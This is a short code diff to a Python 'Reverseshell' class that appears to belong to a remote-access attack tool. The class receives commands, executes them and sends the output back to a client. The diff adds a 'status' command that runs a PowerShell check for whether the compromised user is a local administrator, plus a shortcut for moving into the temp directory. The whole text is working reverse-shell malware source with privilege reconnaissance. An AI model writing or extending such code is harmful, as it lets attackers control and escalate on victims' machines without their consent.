@@ -2,6 +2,7 @@ from core.utils import display_msg
 import os
 import subprocess
 import time
+import tempfile
 
 
 class Reverseshell:
@@ -24,6 +25,8 @@ class Reverseshell:
                 display_msg("No command entered", "r")
             else:
                 try:
+                    if command == "status":
+                        command = "[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match 'S-1-5-32-544')"
                     cmd_result = self.execute_commands(command)
                     client.send_data(cmd_result)
                     print("command executed perfectly")
@@ -35,7 +38,10 @@ class Reverseshell:
     
     def change_dir(self, command):
         path = command.lstrip("cd ")
+        if path == "tempdir":
+            path = tempfile.gettempdir()
         if os.path.exists(path):
+            
             os.chdir(path)
             display_msg("dir changed to " + path)
         else:
